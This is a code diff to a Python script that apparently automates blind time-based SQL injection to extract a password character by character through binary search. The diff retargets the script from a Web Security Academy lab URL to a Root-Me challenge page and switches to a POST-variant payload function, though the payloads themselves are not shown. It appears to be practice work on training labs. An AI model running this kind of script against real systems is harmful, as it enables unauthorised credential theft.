@@ -1,4 +1,4 @@
-from src.payload_and_stuff import sending_payload_for_time_based_SQLi
+from src.payload_and_stuff import sending_payload_for_time_based_SQLi_postv
 import sys
 from colorama import Fore, Style
 from src.info_message import output_message, warning_message, successful_message
@@ -36,11 +36,11 @@ def get_password_with_blind_timed_based_SQLi():
             
         """Here we sending the payload with the initialized parameter only if success = True """
         
-        url = 'https://0a11003a049c59c782385b0800c2003d.web-security-academy.net/login'
+        url = "http://challenge01.root-me.org/web-serveur/ch10/"
         output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
         output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
         output_message(f"[++] Index number : {indice}")
-        result_bool, result_control = sending_payload_for_time_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
+        result_bool, result_control = sending_payload_for_time_based_SQLi_postv(payload_parameter1, payload_parameter2, url, indice)
         #this print is for the verbose, to understand what is it, refer to the 'sending_payload_for_time_based_SQLi' function
         print(f"Result_bool: {result_bool}, Result_control: {result_control}\n")
 
@@ -82,7 +82,7 @@ def get_password_with_blind_timed_based_SQLi():
             output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
             output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
             output_message(f"[++] Index number : {indice}")
-            result_bool, result_control = sending_payload_for_time_based_SQLi(payload_parameter1, payload_parameter2, url, indice)
+            result_bool, result_control = sending_payload_for_time_based_SQLi_postv(payload_parameter1, payload_parameter2, url, indice)
             print(f"[**] Result_bool: {result_bool}, Result_control: {result_control}\n")
 
             
